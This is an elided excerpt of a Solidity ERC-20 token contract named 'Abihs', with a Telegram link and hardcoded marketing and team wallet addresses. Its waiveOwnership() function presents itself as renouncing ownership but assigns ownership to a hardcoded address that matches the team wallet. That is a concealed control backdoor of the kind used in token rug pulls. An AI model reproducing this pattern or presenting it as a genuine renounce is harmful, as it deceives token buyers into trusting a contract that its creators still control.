...
/**
Telegram : https://t.me/AbihsPortal
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xb4aebF3441425aD2e91d947fE3Ef71DfF2bed79b);
    }
...
contract Abihs is Context, IERC20, Ownable {
    ...
    string private _name = "Abihs";
    string private _symbol = "abihS";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xd0ada340794620E3Ad66549Ed650803C4fE916E4);
    address payable public teamWalletAddress = payable(0xb4aebF3441425aD2e91d947fE3Ef71DfF2bed79b);
